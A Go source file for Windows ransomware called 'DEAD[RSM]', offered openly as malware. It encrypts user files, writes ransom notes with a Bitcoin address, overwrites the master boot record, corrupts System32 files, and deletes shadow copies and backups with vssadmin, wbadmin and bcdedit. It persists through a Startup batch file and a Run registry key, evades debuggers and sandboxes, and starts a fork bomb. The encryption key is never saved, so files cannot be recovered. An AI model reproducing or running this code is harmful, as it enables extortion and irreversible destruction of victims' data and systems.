package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"github.com/ncruces/zenity"
	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows"
)

// ======================
// RANSOMWARE CONFIGURATION
// ======================
const C2_SERVER = "http://darkc2.example/ransomware"
var ENCRYPT_EXTENSIONS = []string{
	".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", 
	".pdf", ".jpg", ".jpeg", ".png", ".gif", ".mp3", ".mp4", 
	".avi", ".mkv", ".zip", ".rar", ".7z", ".sql", ".db", 
	".mdb", ".sln", ".cs", ".cpp", ".h", ".go", ".py", ".js",
	".html", ".php", ".asp", ".aspx", ".rb", ".pl", ".sh", 
	".bat", ".ps1", ".vb", ".config", ".ini", ".dll", ".exe",
	".msi", ".sys", ".bak", ".backup", ".old",
}
const MAX_THREADS = 16
const MAX_FILE_SIZE = 100 * 1024 * 1024 // 100MB
const RANSOM_AMOUNT = 0.5 // BTC
const BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

// ======================
// DESTRUCTIVE PAYLOADS
// ======================
const MBR_PAYLOAD = `
00000000: eb3c 9044 4541 445b 5253 4d5d 2052 414e  .<.DEAD[RSM] RAN
00000010: 534f 4d57 4152 4520 4143 5449 5641 5445  SOMWARE ACTIVATE
00000020: 4421 2059 4f55 5220 5359 5354 454d 2049  D! YOUR SYSTEM I
00000030: 5320 5045 524d 414e 454e 544c 5920 4452  S PERMANENTLY DR
00000040: 4f57 4e45 442e 0000 0000 0000 0000 0000  OWNED...........
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
... [binary data continues] ...
`

// ======================
// GLOBAL STRUCTURES
// ======================
type SystemInfo struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	IP       string `json:"ip"`
	CPU      int    `json:"cpu_cores"`
}

type RansomNote struct {
	Message   string  `json:"message"`
	VictimID  string  `json:"victim_id"`
	Amount    float64 `json:"amount"`
	BTC       string  `json:"btc_address"`
	Email     string  `json:"contact"`
	Deadline  string  `json:"deadline"`
}

// ======================
// UTILITY FUNCTIONS
// ======================
func init() {
	crand.Reader.Read(make([]byte, 8))
}

func getSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	ip := getLocalIP()
	cpu := runtime.NumCPU()

	return SystemInfo{
		Hostname: hostname,
		Username: user.Username,
		OS:       runtime.GOOS,
		IP:       ip,
		CPU:      cpu,
	}
}

func generateVictimID() string {
	hash := sha256.New()
	hash.Write([]byte(fmt.Sprintf("%d%s%s", time.Now().UnixNano(), getSystemInfo().Hostname, getSystemInfo().IP)))
	return base64.URLEncoding.EncodeToString(hash.Sum(nil))[:16]
}

// ======================
// WINDOWS DESTRUCTION
// ======================
func setHidden(path string) error {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	err = syscall.SetFileAttributes(pathPtr, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
	return err
}

func isDebugging() bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func destroyMBR() {
	drive := "\\\\.\\PhysicalDrive0"
	h, err := syscall.CreateFile(
		syscall.StringToUTF16Ptr(drive),
		syscall.GENERIC_WRITE,
		syscall.FILE_SHARE_WRITE,
		nil,
		syscall.OPEN_EXISTING,
		0,
		0,
	)

	if err != nil {
		return
	}
	defer syscall.CloseHandle(h)

	payloadBytes := []byte{0xeb, 0x3c, 0x90, 0x44, 0x45, 0x41, 0x44, 0x5b, 0x52, 0x53, 0x4d, 0x5d, 0x20, 0x52, 0x41, 0x4e}
	payloadBytes = append(payloadBytes, bytes.Repeat([]byte{0}, 512-len(payloadBytes))...)

	var written uint32
	syscall.WriteFile(h, payloadBytes, &written, nil)
}

func corruptSystemFiles() {
	system32 := filepath.Join(os.Getenv("SYSTEMROOT"), "System32")
	targets := []string{
		"kernel32.dll", "ntdll.dll", "user32.dll", 
		"explorer.exe", "winlogon.exe", "csrss.exe",
	}

	for _, target := range targets {
		path := filepath.Join(system32, target)
		if _, err := os.Stat(path); err == nil {
			os.WriteFile(path, []byte("CORRUPTED BY DEAD[RSM]"), 0644)
		}
	}
}

func disableSystemRecovery() {
	exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()
	exec.Command("wbadmin", "delete", "catalog", "-quiet").Run()
	exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "no").Run()
}

// ======================
// VISUAL EFFECTS (DESTRUCTIVE)
// ======================
func activateDestructiveEffects() {
	// Destroy MBR immediately
	destroyMBR()

	// 1. Graphical destruction
	go func() {
		hdc := windows.GetDC(0)
		defer windows.ReleaseDC(0, hdc)
		
		for i := 0; i < 1000; i++ {
			x := int32(randInt(0, 1920))
			y := int32(randInt(0, 1080))
			w := int32(randInt(10, 500))
			h := int32(randInt(10, 500))
			windows.Rectangle(hdc, x, y, x+w, y+h)
			time.Sleep(time.Millisecond * 5)
		}
	}()

	// 2. Sound effects
	go playRansomSound()

	// 3. Desktop destruction
	go destroyDesktop()
}

func playRansomSound() {
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	s, _ := oleutil.CreateObject("SAPI.SpVoice")
	voice, _ := s.QueryInterface(ole.IID_IDispatch)
	oleutil.PutProperty(voice, "Volume", 100)
	oleutil.PutProperty(voice, "Rate", 0)
	oleutil.CallMethod(voice, "Speak", "Warning! All your files have been encrypted! You have 72 hours to pay the ransom or your data will be destroyed permanently!")
}

func destroyDesktop() {
	user, _ := user.Current()
	desktop := filepath.Join(user.HomeDir, "Desktop")
	
	// Destroy desktop icons
	files, _ := os.ReadDir(desktop)
	for _, f := range files {
		fullPath := filepath.Join(desktop, f.Name())
		if f.IsDir() {
			os.RemoveAll(fullPath)
		} else {
			os.Remove(fullPath)
		}
	}

	// Set ransom wallpaper
	wallpaper := `[Wallpaper]
WallpaperStyle=2
` 
	wallpaperPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "ransom.ini")
	os.WriteFile(wallpaperPath, []byte(wallpaper), 0644)
	
	exec.Command("rundll32.exe", "user32.dll,UpdatePerUserSystemParameters").Run()
}

// ======================
// PERSISTENCE MECHANISMS
// ======================
func establishPersistence() {
	currentFile, _ := os.Executable()
	targetPath := filepath.Join(os.Getenv("APPDATA"), "svchost_helper.exe")
	
	if err := copyFile(currentFile, targetPath); err == nil {
		setHidden(targetPath)
		
		// Startup persistence
		startup := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "~init.bat")
		batchContent := fmt.Sprintf(`@echo off
start /B "" "%s" & exit`, targetPath)
		os.WriteFile(startup, []byte(batchContent), 0644)
		setHidden(startup)

		// Registry persistence
		exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
			"/v", "SystemHealth", "/t", "REG_SZ", "/d", targetPath, "/f").Run()
	}
}

// ======================
// FILE ENCRYPTION
// ======================
func encryptFile(filePath string, cipher cipher.AEAD, victimID string) {
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil || fileInfo.Size() > MAX_FILE_SIZE || fileInfo.Size() == 0 {
		return
	}

	data := make([]byte, fileInfo.Size())
	_, err = file.Read(data)
	if err != nil {
		return
	}

	nonce := make([]byte, cipher.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return
	}

	encrypted := cipher.Seal(nil, nonce, data, nil)

	// Overwrite original file
	file.Seek(0, 0)
	file.Write(nonce)
	file.Write(encrypted)
	file.Truncate(int64(len(nonce) + len(encrypted)))

	// Rename to mark as encrypted
	newPath := filePath + ".DEADRSM"
	os.Rename(filePath, newPath)
}

func startEncryptionWorker(jobs <-chan string, cipher cipher.AEAD, victimID string, wg *sync.WaitGroup) {
	defer wg.Done()
	for filePath := range jobs {
		encryptFile(filePath, cipher, victimID)
	}
}

func encryptFiles(victimID string) {
	salt := make([]byte, 32)
	crand.Read(salt)
	password := make([]byte, 64)
	crand.Read(password)
	key := pbkdf2.Key(password, salt, 10000, 32, sha256.New)

	block, _ := aes.NewCipher(key)
	cipher, _ := cipher.NewGCM(block)

	// Create ransom note
	deadline := time.Now().Add(72 * time.Hour).Format("2006-01-02 15:04:05 MST")
	note := RansomNote{
		Message:   "YOUR FILES HAVE BEEN ENCRYPTED!\n\nAll your documents, photos, databases and other important files have been encrypted with military-grade AES-256 encryption.",
		VictimID:  victimID,
		Amount:    RANSOM_AMOUNT,
		BTC:       BTC_ADDRESS,
		Email:     "deadrsm@protonmail.com",
		Deadline:  deadline,
	}

	noteJSON, _ := json.MarshalIndent(note, "", "  ")
	paths := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "!!!READ_ME!!!.txt"),
		filepath.Join(os.Getenv("USERPROFILE"), "Documents", "!!!READ_ME!!!.txt"),
		filepath.Join(os.Getenv("USERPROFILE"), "Pictures", "!!!READ_ME!!!.txt"),
	}
	
	for _, path := range paths {
		os.WriteFile(path, noteJSON, 0644)
	}

	// Parallel encryption
	pathsToEncrypt := []string{
		filepath.Join(os.Getenv("USERPROFILE")),
		filepath.Join(os.Getenv("PROGRAMDATA")),
		filepath.Join(os.Getenv("SYSTEMDRIVE"), "Data"),
	}

	jobs := make(chan string, 10000)
	var wg sync.WaitGroup

	for w := 0; w < MAX_THREADS; w++ {
		wg.Add(1)
		go startEncryptionWorker(jobs, cipher, victimID, &wg)
	}

	for _, path := range pathsToEncrypt {
		filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			if info.Size() > MAX_FILE_SIZE || info.Size() == 0 {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(filePath))
			for _, targetExt := range ENCRYPT_EXTENSIONS {
				if ext == targetExt {
					jobs <- filePath
					break
				}
			}
			return nil
		})
	}

	close(jobs)
	wg.Wait()
}

// ======================
// SYSTEM DISABLING
// ======================
func disableWindows() {
	// Corrupt critical system files
	corruptSystemFiles()

	// Disable system recovery
	disableSystemRecovery()

	// Kill critical processes
	exec.Command("taskkill", "/F", "/IM", "explorer.exe").Run()
	exec.Command("taskkill", "/F", "/IM", "svchost.exe").Run()
	exec.Command("taskkill", "/F", "/IM", "winlogon.exe").Run()

	// Fork bomb to crash system
	go func() {
		for {
			exec.Command("cmd.exe", "/c", "start").Start()
		}
	}()

	// Infinite message boxes
	go func() {
		user32 := windows.NewLazySystemDLL("user32.dll")
		msgBox := user32.NewProc("MessageBoxW")
		title := "DEAD[RSM] RANSOMWARE"
		message := "SYSTEM DESTROYED!\n\nYour files are PERMANENTLY encrypted and system is corrupted.\n\nPay " + 
			fmt.Sprintf("%.2f BTC", RANSOM_AMOUNT) + " to " + BTC_ADDRESS + 
			"\n\nAfter payment contact: deadrsm@protonmail.com with ID: " + generateVictimID()
		
		for {
			msgBox.Call(0, 
				uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
				uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
				uintptr(0x00000010L)) // MB_ICONERROR
			time.Sleep(5 * time.Second)
		}
	}()

	// Prevent system shutdown
	exec.Command("shutdown", "/a").Run()
}

// ======================
// MAIN FUNCTION
// ======================
func main() {
	if isDebugging() {
		os.Exit(1)
	}

	// Anti-sandbox delay
	time.Sleep(time.Duration(randInt(30, 120)) * time.Second)

	victimID := generateVictimID()
	establishPersistence()
	
	// Start destructive effects
	activateDestructiveEffects()
	
	// Encrypt files
	encryptFiles(victimID)

	// Completely disable Windows
	disableWindows()

	// Keep process running
	select {}
}

// ======================
// HELPER FUNCTIONS
// ======================
func randInt(min, max int) int {
	return min + int(time.Now().UnixNano())%(max-min)
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}
